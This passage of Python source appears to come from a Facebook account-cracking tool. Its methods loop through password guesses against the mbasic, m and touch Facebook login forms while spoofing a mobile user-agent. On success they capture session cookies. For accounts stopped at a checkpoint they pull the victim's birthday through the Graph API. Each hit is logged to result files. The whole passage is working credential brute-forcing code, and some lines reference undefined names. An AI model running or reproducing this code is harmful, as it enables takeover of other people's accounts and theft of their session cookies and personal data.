                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s[CP] %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s[CP] %s • %s           ' % (h,user,pw)
                cp.append('%s ◊ %s' % (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m'])
        print('\r %s[*] %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def basic(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s[OK] %s • %s • %s  ' % (O,user,pw,kuki)
                ok.append("%s ◊ %s ◊ %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    toket = open('xnxcode.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s[CP] %s • %s • %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s[cp] %s • %s            ' % (K,user,pw)
                cp.append("%s ◊ %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        _random_ = random.choice(['\x1b[1;91m', '\x1b[1;92m'])
        print('\r %s[*] %s/%s [OK-:%s]-[CP-:%s]'%(_random_,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def mobil(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s[OK] %s • %s • %s ' % (O,user,pw,kuki)
                ok.append("%s ◊ %s ◊ %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    toket = open('xnxcode.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s[CP] %s • %s • %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s[CP] %s • %s              ' % (K,user,pw)
                cp.append("%s ◊ %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        _memek_ = random.choice(['\x1b[1;91m', '\x1b[1;92m'])
        print('\r %s[*] %s/%s [OK-:%s]-[CP-:%s]'%(_memek_,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()

    def __mfb__(self, user, __cok__):
        global ok,cp,loop
        for i in list('<|->'):
            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(P,i,P,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __cok__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('xnxcode.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if 'c_user' in ses.cookies.get_dict().keys():
                coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print('\r %s* --> %s|%s|%s                 %s' % (H,user,pw,coki,N))
                wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r %s* --> %s|%s                %s' % (K,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1

    def mobile(self,uid, khamdihi):
        try:
             ua = open("ua", "r").read()
        except IOError:
             ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
        global ok, cp, loop, token
        for pw in khamdihi:
                kwargs = {}
                pw = pw.lower()
                ses = requests.Session()
                ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
                p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
                b = parser(p,"html.parser")
                bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
                for i in b("input"):
                    try:
                         if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
                         else:continue
                    except:pass
                kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
                deku = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
                if "c_user" in ses.cookies.get_dict().keys():
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
                    print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
                    ok.append("%s|%s"%(uid, pw))
                    open("ok.txt","a").write("%s|%s\n"%(uid, pw))
                    break
                elif "checkpoint" in ses.cookies.get_dict().keys():
                    try:
                         token = open("xnxcode.txt", "r").read()
                         with requests.Session() as ses:
                              ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
                              month, day, year = ttl.split("/")
                              month = bulan_ttl[month]
                              print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
                              cp.append("%s|%s"%(uid, pw))
                              open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
                              open("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
                              break
                    except (KeyError, IOError):
                              day = (" ")
                              month = (" ")
                              year = (" ")
                    except:pass
                    print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
                    cp.append("%s|%s"%(uid, pw))
                    open("cp.txt","a").write("%s|%s\n"%(uid, pw))
                    open("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
                    break
                    continue
        loop += 1
        print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()

if __name__ == '__main__':
   os.system('git pull')
   bot()
   folder()
   menu()
